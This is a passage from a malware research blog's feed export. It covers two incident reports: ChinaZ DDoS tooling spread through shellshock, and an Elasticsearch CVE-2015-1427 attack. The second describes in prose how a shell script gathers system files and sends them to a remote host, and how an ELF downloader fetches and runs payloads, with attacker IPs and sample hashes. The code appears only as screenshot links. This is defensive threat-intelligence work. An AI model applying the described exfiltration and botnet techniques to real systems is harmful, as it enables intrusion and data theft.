href=\"https:\/\/lh3.googleusercontent.com\/-5teBo3uwfi0\/VZOyccloIBI\/AAAAAAAASSE\/LgO6RDuWsck\/s1580\/1004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5teBo3uwfi0\/VZOyccloIBI\/AAAAAAAASSE\/LgO6RDuWsck\/s580\/1004.png\u003E\u003C\/a\u003E\u003Cbr\u003EIf you run it, it will seek for binary templates of ELF (x32 or x64) and windows (x32) in the subfolders, and popping up the menu to build the package under any desired IP. The port number is a fixed number of 29136, encryption used in the templates is not allowing modification for this value, by this, we know this bad actor is not the software coder but a mere player:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-M_ieZ4matjE\/VZOyZ1QfAhI\/AAAAAAAASRs\/Y_Qvv7SEYOA\/s1600\/1002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-M_ieZ4matjE\/VZOyZ1QfAhI\/AAAAAAAASRs\/Y_Qvv7SEYOA\/s400\/1002.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe reversing code shows how the builder work, it is a safe application. Sorry I have to do day work so this is only a short peek of my reversing for you, it shows the path of the template binary used for this builder to make it work. If the path doesn't exist the builder will not build anything:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-CGMq0Pnzqho\/VZO26OQy63I\/AAAAAAAASSQ\/zzRUzvJNP6Y\/s1580\/1005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-CGMq0Pnzqho\/VZO26OQy63I\/AAAAAAAASSQ\/zzRUzvJNP6Y\/s580\/1005.png\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003EPoC #2: \u003Cb\u003EThe builder's template is ChinaZ:\u003C\/b\u003E --\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/4f3d7e0f2ee9ed72a1c6b26e4967ee6dc902713878fd8c103162e88b792c41f3\/analysis\/\"\u003EVT\u003C\/a\u003E] and [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/611f3978c8e1802a7ffc32857ae8e588127080898a1b77854620c5468b8afb0e\/analysis\/\"\u003EVT\u003C\/a\u003E]\u003Cbr\u003EI am taking the template binary of the builder used of \"\u003Cb\u003E\\\\Arch32\\\\DDosClientTemp32\u003C\/b\u003E\", the x32 template ELF file, to PoC is it the ChinaZ or not. In the previous BLOG about the ChinaZ we disclosed the GitHub URL used to develop the ChinaZ malware, our friend's @benkow suggested to take it as example to make a smart PoC as per below snip code, the marked part are functions that ChinaZ used specifically:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1NT0MXq4YhE\/VZO4pIJrJlI\/AAAAAAAASSc\/pOYxPLEcUI8\/s1555\/1006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1NT0MXq4YhE\/VZO4pIJrJlI\/AAAAAAAASSc\/pOYxPLEcUI8\/s580\/1006.png\u003E\u003C\/a\u003E\u003Cbr\u003EAnd the code is perfectly matched to the binary value in \"\u003Cb\u003E\\\\Arch32\\\\DDosClientTemp32\u003C\/b\u003E\" \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-po2gHeRlc34\/VZO6j6f-kmI\/AAAAAAAASSo\/HaUu40DG4Uo\/s1800\/1007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-po2gHeRlc34\/VZO6j6f-kmI\/AAAAAAAASSo\/HaUu40DG4Uo\/s580\/1007.png\u003E\u003C\/a\u003E \u003Cp\u003EPoC #3: \u003Cb\u003EThe CNC software of ChinaZ\u003C\/b\u003E --\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/8b5821e339c7ca0056067495c29683192c51c11ea1f6cff286a98accae0ade66\/analysis\/\"\u003EVT\u003C\/a\u003E]\u003Cbr\u003E In the same zip it was found the CNC software of ChinaZ, contains the below files and log:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-XWY5jvnNw_s\/VZOyZ25julI\/AAAAAAAASRw\/DDBfLoDdbCc\/s1700\/1001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-XWY5jvnNw_s\/VZOyZ25julI\/AAAAAAAASRw\/DDBfLoDdbCc\/s580\/1001.png\u003E\u003C\/a\u003E\u003Cbr\u003EAnd if you runs it the CNC software of CNC is run and bound to your port to listen to ChinaZ DDoS client\/agent\/bot to connect to you: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-wjay_TbTuOg\/VZOyZ2dPBdI\/AAAAAAAASR0\/VEAvDUoH1nw\/s1700\/1003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-wjay_TbTuOg\/VZOyZ2dPBdI\/AAAAAAAASR0\/VEAvDUoH1nw\/s580\/1003.png\u003E\u003C\/a\u003E \u003Cp\u003EBased on the 3 PoCs above we are sure \u003Ci\u003Ebeyond any doubt\u003C\/i\u003E that; Host in \u003Cb\u003E58.221.254.153\u003C\/b\u003E that attacked many Linux hosts in the internet with the \u003Cb\u003Eshellshock attack to infect malware binaries\u003C\/b\u003E belongs to \u003Cb\u003EChinaZ actor(s)\u003C\/b\u003E, and therefore the ID data stated in previous chapter are all directly related to ChinaZ bad actor(s) in this case and ChinaZ previous post \u003Cb\u003EMMD-0032-2015\u003C\/b\u003E.\u003Cbr\u003E\u003Ci\u003EThank Benkow for spotting \"stuff\" in 58.221.254.153\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003ESamples \u0026 Virus Total link\u003C\/h2\u003E \u003Cp\u003EThese are the samples I uploaded with correct names in the VirusTotal:\u003Cbr\u003E1122.32.ELF.IptableX.DDoS \u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/bef8a9f5a79cf34f0859ced695064fe15b767c2a7784428f28ae8a4d5a2f9b4c\/analysis\/1435727299\/\"\u003E58eefd9183ac89a1b99dda02e0ab4092 \u003C\/a\u003E\u003Cbr\u003E1122.64.ELF.IptableX.DDoS \u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/7a95839cf6f72e2d2b2ef13079cf86527dcf3455aaa13b7f4e06785a950eed0c\/analysis\/1435727314\/\"\u003E8d18ddc23603726181ebb77931aa11f3 \u003C\/a\u003E\u003Cbr\u003Esudp.Elf.BillGates.DDoS   \u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/067fbb577a6fe90c8135cc7ba00eebec7fb1b94f350d4026fe48654d286f1587\/analysis\/1435727380\/\"\u003E84d431618cbbbf56fe0cc3d34f62a655 \u003C\/a\u003E\u003Cbr\u003E \u003CP\u003E..and all of the samples I share in kernelmode here [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3468\u0026p=26218#p26218\"\u003Elink\u003C\/a\u003E] and in here [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3429\u0026start=50#p26219\"\u003Elink\u003C\/a\u003E] and also in here [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3682\u0026p=26220#p26220\"\u003Elink\u003C\/a\u003E].\u003Cp\u003E\u003Cbr\u003E \u003Ca name=\"new\"\u003E\u003Cp\u003E\u003Ch2\u003EChinaZ's IpabLes|x and.. Linux\/Xor.DDOS!! - a new variation:\u003C\/h2\u003E\u003C\/a\u003E \u003Cp\u003EThe same machine served same IptabLes|x was spotted online: \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/WhiskeyNeon\"\u003E@WhiskeyNeon\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/c0mmand3r420\"\u003E@c0mmand3r420\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/DHAhole\"\u003E@DHAhole\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/TinkerSec\"\u003E@TinkerSec\u003C\/a\u003E It\u0026#39;s same m\/c we saw back then, except now global IP is new. No doubt. \u003Ca href=\"http:\/\/t.co\/fNF7X1dmaX\"\u003Epic.twitter.com\/fNF7X1dmaX\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/620530765978140673\"\u003EJuly 13, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThese are the shellshock used, the panels, the same ELF bin and the traffic: \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E screenshots of this case is attached from various sources | thx to all \u003Ca href=\"http:\/\/t.co\/MB5NRPmvA5\"\u003Epic.twitter.com\/MB5NRPmvA5\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/620509795955511296\"\u003EJuly 13, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003ESame IP also used as landing for shellshock attack on July 10th 2015 \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E atack log on Jul 10 2015 \u003Ca href=\"http:\/\/t.co\/kRRhWoNTvc\"\u003Epic.twitter.com\/kRRhWoNTvc\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/620533109767811073\"\u003EJuly 13, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EBut this time instead of using Linux\/BillGates as additional malware, it uses LinuxXOR.DDoS instead: \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E..and it looks like \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ChinaZ?src=hash\"\u003E#ChinaZ\u003C\/a\u003E actor starting to spread \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/XOR.DDoS\u0026#39;er \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E too.See the HIT\u0026#10;\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/12y46gw1HS\"\u003Epic.twitter.com\/12y46gw1HS\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/620428803869818880\"\u003EJuly 13, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThe location of the new IP is also shifted to the Beijing.. \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EWhere ChinaZ crook is now.. \u0026#10;211.147.2.192|ASN4847|211.147.0.0\/21|CNIX\u0026#10;Beijing 39.9289,116.3883\u0026#10;CNCGROUP China169 \u003Ca href=\"http:\/\/t.co\/5I1DHmPKcc\"\u003Epic.twitter.com\/5I1DHmPKcc\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/620477407007408129\"\u003EJuly 13, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E.  \u003Cp\u003EThe samples are here: \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"pt\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E verdict samples VT\u0026#10;\u003Ca href=\"https:\/\/t.co\/0tUopyurdo\"\u003Ehttps:\/\/t.co\/0tUopyurdo\u003C\/a\u003E\u0026#10;\u003Ca href=\"https:\/\/t.co\/lmjmb1m3ux\"\u003Ehttps:\/\/t.co\/lmjmb1m3ux\u003C\/a\u003E\u0026#10;\u003Ca href=\"https:\/\/t.co\/nlVkrrSYPT\"\u003Ehttps:\/\/t.co\/nlVkrrSYPT\u003C\/a\u003E\u0026#10;Repo:\u0026#10;\u003Ca href=\"http:\/\/t.co\/feoiCwK8gZ\"\u003Ehttp:\/\/t.co\/feoiCwK8gZ\u003C\/a\u003E\u0026#10;\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MMD?src=hash\"\u003E#MMD\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/620478495597068289\"\u003EJuly 13, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E#MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/4789848612856004558\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/06\/mmd-0035-2015-iptablex-or-iptables-on.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/4789848612856004558"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/4789848612856004558"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/06\/mmd-0035-2015-iptablex-or-iptables-on.html","title":"MMD-0035-2015 - .IptabLex or .IptabLes on shellshock.. sponsored by ChinaZ actor"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-9lZToyDs3mI\/VZNW3lIVVwI\/AAAAAAAASPU\/Dx6fQ7yI5ow\/s72-c\/004.png","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-3634457454629484029"},"published":{"$t":"2015-06-25T11:18:00.002-07:00"},"updated":{"$t":"2015-06-30T14:55:23.294-07:00"},"title":{"type":"text","$t":"MMD-0034-2015 - New ELF Linux\/DES.Downloader on Elasticsearch CVE-2015-1427 exploit"},"content":{"type":"html","$t":"This is a tough writing, and will be many information will be added after the initial release. We are pushed to release this as alert of an on-going attack on Elasticsearch host(s), it is a real malware incident report, below is the contents:  \u003Cp\u003E\u003Ch2\u003EThe background\u003C\/h2\u003E \u003Cp\u003EElasticsearch [\u003Ca href=\"https:\/\/www.elastic.co\/products\"\u003Elink\u003C\/a\u003E] has vulnerability which is now exploited in the wild, this post is one of the attack which aiming the CVE-2015-1427 [\u003Ca href=\"http:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2015-1427\"\u003Elink\u003C\/a\u003E], quoted: a vulnerability in Groovy scripting engine in Elasticsearch before 1.3.8 and 1.4.x before 1.4.3  allows remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands via a crafted script. Elasticsearch's Groovy dynamic scripting disabled by default from v1.4.3 due to this vulnerability [\u003Ca href=\"https:\/\/www.elastic.co\/guide\/en\/elasticsearch\/reference\/current\/modules-scripting.html\"\u003Elink\u003C\/a\u003E], which is a recommendable way to mitigate this on going attack.  \u003Cp\u003EIn this incident, the attacker is using the shell command to download and execute the malware shell script file, to collect sensitive information of the unix system hosted by Elasticsearch and send it to the remote host, parallel with download+install the ELF malware functioned as the botnet agent backdoor \u0026 downloader on the victim's host.It also audits the victim's system with \u003Cb\u003ELynis\u003C\/b\u003E [\u003Ca href=\"https:\/\/cisofy.com\/download\/lynis\/\"\u003Elink\u003C\/a\u003E] and send the result to the remote host too.  \u003Cp\u003E\u003Ch2\u003EIncident information\u003C\/h2\u003E \u003Cp\u003E\u003Cb\u003EAttacker IP addresses and its origin;\u003C\/b\u003E\u003Cpre class=\"brush: asm\"\u003E218.213.77.20 ||AS9293 | 218.213.77.0\/24 | HKNET | HK | hknet.com | HKNet Company Ltd\/NTT Com Asia Ltd\u003Cbr \/\u003E218.213.77.196||AS9293 | 218.213.77.0\/24 | HKNET | HK | hknet.com | HKNet Company Ltd\/NTT Com Asia Ltd\u003Cbr \/\u003E106.39.95.195 ||AS4847 | 106.39.0.0\/16   | CNIX  | CN | chinatelecom.com.cn | China Networks Inter-Exchange\u003C\/pre\u003E \u003Cp\u003ETime: \u003Cpre class=\"brush: asm\"\u003E2015-06-18 10:07:54+02:00 to 2015-06-24 12:04:29+02:00\u003C\/pre\u003E \u003Cp\u003EAttack pattern used:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-kn67qbGnfyU\/VYvonJEiHVI\/AAAAAAAASHo\/pealRK2Fnng\/s1912\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-kn67qbGnfyU\/VYvonJEiHVI\/AAAAAAAASHo\/pealRK2Fnng\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003EWhich is matched to a publicly shared exploit proof of concept code here:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-AWh7yBNW5d0\/VYvomyTy1qI\/AAAAAAAASHk\/XNSgTxe4tOs\/s1720\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-AWh7yBNW5d0\/VYvomyTy1qI\/AAAAAAAASHk\/XNSgTxe4tOs\/s580\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003E\u003Cb\u003EPayloads:\u003C\/b\u003E\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E[1] Script: (filesender1.sh) = dcc78c4a1d940860566830a06331f2a5 5,726 bytes\u003Cbr \/\u003E[2] ELF   : (dnler) = 982dd916fe4111f01233f8c928293383 806,314 bytes\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003EAnalysis:\u003C\/h2\u003E \u003Cp\u003E\u003Ch2\u003E[1] Script: (filesender1.sh)\u003C\/h2\u003E \u003Cp\u003EIt is a (1) shell script (sh) file, (2) defining echo command as print function and (3) storing the long list of NIX system configuration file in \u003Cb\u003E\"filelst\"\u003C\/b\u003E variable:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-RDIV_PSP7CM\/VYvtrxuyf4I\/AAAAAAAASH4\/oYDwEDejKPc\/s1512\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-RDIV_PSP7CM\/VYvtrxuyf4I\/AAAAAAAASH4\/oYDwEDejKPc\/s580\/003.png\u003E\u003C\/a\u003E \u003Cp\u003EThe full list of the \u003Cb\u003E\"filelst\"\u003C\/b\u003E:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Es-Hd-fQMxw\/VYvwswO-LEI\/AAAAAAAASIA\/269BB0i2y2c\/s1720\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Es-Hd-fQMxw\/VYvwswO-LEI\/AAAAAAAASIA\/269BB0i2y2c\/s580\/004.png\u003E\u003C\/a\u003E \u003Cp\u003EAnd then also storing the long list of the NIX command line in variable \u003Cb\u003E\"cmdlst\"\u003C\/b\u003E with the same method above with the full list of commands as below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-mRP75yrYvXg\/VYvycJtNTtI\/AAAAAAAASIQ\/LXVPckcQGxw\/s1512\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-mRP75yrYvXg\/VYvycJtNTtI\/AAAAAAAASIQ\/LXVPckcQGxw\/s580\/005.png\u003E\u003C\/a\u003E \u003Cp\u003EIn the main() function of the malware script, the initiation process was executed by setting the CNC, URL and the CHROOT variable which will be used for the next functions:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-9ABxccHm9Z4\/VYv18aIo7AI\/AAAAAAAASIg\/uUA_xtYSw7A\/s1592\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-9ABxccHm9Z4\/VYv18aIo7AI\/AAAAAAAASIg\/uUA_xtYSw7A\/s450\/007.png\u003E\u003C\/a\u003E \u003Cp\u003EThe (4)user detection and (5) hostname is set in here:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-IHOMFYzuBAc\/VYv7wHYgc1I\/AAAAAAAASJE\/1HPT90qpPzI\/s1640\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-IHOMFYzuBAc\/VYv7wHYgc1I\/AAAAAAAASJE\/1HPT90qpPzI\/s580\/006.png\u003E\u003C\/a\u003E \u003Cp\u003EThe two functions of \u003Cb\u003Epreparefile()\u003C\/b\u003E and \u003Cb\u003Epreparecmdresult()\u003C\/b\u003E are where it started to perform the malicious actions. The (6) preparefile() is sending the copy of your file that can be grabbed as per listed \u003Cb\u003E\"filelst\"\u003C\/b\u003E to be copied in to the directory under \/tmp that was defined in CHROOT above:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-jXKD0_Jg9cY\/VYv7wHz-3_I\/AAAAAAAASI4\/AudVRDuFrBg\/s1738\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-jXKD0_Jg9cY\/VYv7wHz-3_I\/AAAAAAAASI4\/AudVRDuFrBg\/s580\/008.png\u003E\u003C\/a\u003E \u003Cp\u003EAnd the (7)\u003Cb\u003Epreparecmdresult()\u003C\/b\u003E is executing the result of the command lines listed in the \u003Cb\u003E\"cmdlst\"\u003C\/b\u003E and save it under \/tmp with the path as per described in the picture below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ijIsHEDZc6o\/VYv7wFpkCsI\/AAAAAAAASJA\/I9rABFhgkFA\/s1912\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ijIsHEDZc6o\/VYv7wFpkCsI\/AAAAAAAASJA\/I9rABFhgkFA\/s580\/009.png\u003E\u003C\/a\u003E \u003Cp\u003EThe tarfile() functions is there to (8) archive all of the result of the command line executed output AND the system copied files, and sendfile() functions is for (9) sending them under specific URL in the remote host using cURL or wget with the POST method. By this URL we can see the OS type, hostname and message from the infected server. A botnet scheme indeed:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EZMUGBtfWXI\/VYwAHoqiRGI\/AAAAAAAASJQ\/VWWBQUyvLN4\/s1912\/010.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-EZMUGBtfWXI\/VYwAHoqiRGI\/AAAAAAAASJQ\/VWWBQUyvLN4\/s580\/010.png\u003E\u003C\/a\u003E \u003Cp\u003EThose functions listed above is (10) executed in the main() function next lines in the bottom of the script. After the execution the script is (11) downloading lynix (the UNIX server legit audit tool, and run it with saving the audit result that is saved under save malicious directory made in \/tmp to the remote host using the sendfile() function. Not only that the script is (12) downloading the ELF malware from the remote host and executing it from the same malicious directory too. And then the script is deleting all of the trace of the directory and files saved during the infection. The code is below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0VvYn0ORuWc\/VYwEMWdvE2I\/AAAAAAAASJc\/z5FwHrGtg1s\/s1640\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0VvYn0ORuWc\/VYwEMWdvE2I\/AAAAAAAASJc\/z5FwHrGtg1s\/s580\/011.png\u003E\u003C\/a\u003E \u003Cp\u003EWe don't share the complete code of this script for the security policy, and this script was uploaded to the Virus Total. We haven't seen this before but the similar shell scripts were found plenty in the wild, so this malware can be categorized as a \u003Cb\u003E\"Shell Backdoor\"\u003C\/b\u003E.  \u003Cp\u003E\u003Ch2\u003E[2] ELF : (dnler) Linux\/DES.Downloader\u003C\/h2\u003E \u003Cp\u003EThe ELF file is having the below characteristic: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xGrAAg_KSLA\/VYwI0BtmWkI\/AAAAAAAASJo\/5Uvs4sgk7gg\/s1576\/012.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xGrAAg_KSLA\/VYwI0BtmWkI\/AAAAAAAASJo\/5Uvs4sgk7gg\/s500\/012.png\u003E\u003C\/a\u003E \u003Cp\u003EThis sample was downloaded from the remote host during infection process as per recorded in the log below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-zeDdBq2chMc\/VYwLVXzIfBI\/AAAAAAAASJ0\/lHWYafUCNY8\/s1912\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-zeDdBq2chMc\/VYwLVXzIfBI\/AAAAAAAASJ0\/lHWYafUCNY8\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003Ethe malware\/botnet CNC host is located in here:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"218.213.77.197 \/ 218.213.77.0\/24\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Hong Kong\",\u003Cbr \/\u003E  \"country\": \"HK\",\u003Cbr \/\u003E  \"loc\": \"22.2833,114.1500\",\u003Cbr \/\u003E  \"org\": \"AS9293 NTT Com Asia Limited\"\u003C\/pre\u003E..geo location is pointing to this area in Hongkong:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-HGIfPXJVbo0\/VYwNFFvBFLI\/AAAAAAAASKA\/Moqxs4PmDWI\/s1912\/1001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-HGIfPXJVbo0\/VYwNFFvBFLI\/AAAAAAAASKA\/Moqxs4PmDWI\/s500\/1001.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Cb\u003EWhat is this ELF malware\u003C\/b\u003E \u003Cp\u003EAs a summary, this malware will run under current Elesticsearch's user privilege or permission and check whether it can escalate its privilege (to root). After the self-checking for the current version and comparing to the previous installation, it will continue to run initially, or stopped if the previous running instance was detected, or requesting the update to the \u003Cb\u003Emotherhost\u003C\/b\u003E. During the initial installation, it will register an autorun in crontab, And it runs as daemon to then contacting (and keep on contacting regularly) the \u003Cb\u003Emotherhost \u003C\/b\u003Evia HTTP to poke and requesting a download, and then to decrypt the part of downloaded (GIF in this case..can be changed) data (by DES2) and save it in the work directory to be executed. The dropped data (in this case, this also can be changed) is a shell script as per described in the section above.  \u003Cp\u003EWe never see this type of ELF malware before, so we are naming it as \u003Cb\u003ELinux\/DES.Downloader\u003C\/b\u003E, this threat was detected by Benkow, so to honor his effort, internally in MMD I will refer it as \u003Ci\u003EBenloader\u003C\/i\u003E :)  \u003Cp\u003E\u003Cb\u003ESome reversing snapshot\u003C\/b\u003E \u003Cp\u003EA trace of the malware is as a downloader:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8OBjeY6HWAs\/VYwOv-5dgTI\/AAAAAAAASKU\/L4d-CbWIF2A\/s1912\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8OBjeY6HWAs\/VYwOv-5dgTI\/AAAAAAAASKU\/L4d-CbWIF2A\/s580\/003.png\u003E\u003C\/a\u003E \u003Cp\u003E..is having the DES decryption with the below key (used for encrypt the infected machine's data detected by the ELF as botnet agent sent in HTTP botnet request):\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-N4FAWG-PhYQ\/VYwOpJQGQMI\/AAAAAAAASKM\/Err7LPR6wmo\/s1912\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-N4FAWG-PhYQ\/VYwOpJQGQMI\/AAAAAAAASKM\/Err7LPR6wmo\/s580\/002.png\u003E\u003C\/a\u003E \u003Cp\u003EProof of concept of the DES encryption used is as per decrypted in this video:\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/k07EAi_acvk?rel=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003EThis 